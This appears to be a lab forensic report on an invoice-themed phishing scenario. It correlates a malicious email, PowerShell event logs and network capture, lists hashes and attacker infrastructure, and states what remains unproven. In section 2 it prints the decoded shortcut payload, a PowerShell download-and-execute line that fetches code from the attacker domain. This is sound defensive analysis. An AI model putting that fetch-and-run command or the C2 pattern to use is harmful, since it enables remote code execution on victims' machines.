# Technical Investigation Report

## 1. Scope

Correlate the supplied email (`dump.eml`), PowerShell event export (`powershell.json`), and network capture (`capture.pcapng`) for the invoice-themed phishing scenario. Analysis is confined to the authorized lab artefacts and outputs supplied during the investigation.

## 2. Email and attachment

The message from `agriffin@bpakcaging.xyz` to Julianne Westcott is titled `Collection for Quick Logistics LLC - Jan 2023`, references invoice `#39586972`, states a payment due date of 20 January 2023, and provides a password for `Invoice.zip`. SPF and DKIM fields report passes for the displayed domain; DMARC is shown as `bestguesspass action=none`. These results do not establish legitimacy.

`Invoice.zip` is 908 bytes with SHA-256 `b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87`. It contains `Invoice_20230103.lnk` (2,344 bytes), SHA-256 `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8`.

The shortcut uses hidden, encoded PowerShell. Its decoded command is:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

## 3. Endpoint findings

PowerShell event 4104, record 500, around `2023-01-13 17:10:07 UTC`, records the initial download-and-execute pattern. Event 4104, record 501, around `17:10:11 UTC`, references `cdn.bpakcaging.xyz:8080`, polling for commands, execution via `iex`, and posting results. Later logs show errors and Seatbelt-related commands. These support suspicious execution and attempted host reconnaissance; individual errors and commands must not be interpreted as proof that every action succeeded.

## 4. Network findings

- `10.10.182.255` requested `files.bpakcaging.xyz/update` at `17:10:09.751986 UTC`.
- Repeated HTTP GET/POST traffic was observed to `159.89.205.40:8080`, with Host `cdn.bpakcaging.xyz:8080` and repeated POST URI `/27fe2489`.
- TCP stream 150 contains partially decoded Windows process-listing output.
- TCP stream 1076 contains a POST declaring 78,618 bytes; the server returned HTTP 200. Partial body decoding shows DNS lookup errors and resolver output, but the complete body has not been validated as text.
- 88 unique long hexadecimal-label DNS queries under `bpakcaging.xyz` were observed from `10.10.182.255` to `167.71.211.113`; matching responses returned NOERROR with zero answers.
- A request to `169.254.169.254/latest/meta-data/iam/security-credentials/` received HTTP 404. Credential retrieval is not evidenced.

## 5. Correlation and assessment

The LNK command, PowerShell event logs, and PCAP align around the initial remote retrieval and subsequent recurring HTTP activity. The POST process listing and Seatbelt-related endpoint commands support host reconnaissance. The long-label DNS activity and matching errors in partial POST output are suspicious and temporally correlated with the HTTP communications.

**Overall:** high confidence of suspicious PowerShell execution and command-and-control-like communication with attempted host reconnaissance.

## 6. Limitations

The full POST body in stream 1076 was not fully decoded and validated. HTTP status 200 does not prove successful exfiltration. DNS tunnelling, credential theft, persistence, lateral movement, and complete impact are not established. The role of `167.71.211.113` as a DNS resolver/peer is based on the observed packet exchange and has not been independently validated.

## 7. Recommended response

Preserve artefacts and hashes; isolate the affected host if this were a live incident; hunt for the observed domains, IP, URI paths, and PowerShell behaviors; review endpoint and identity logs for scope; and remediate based on verified findings.
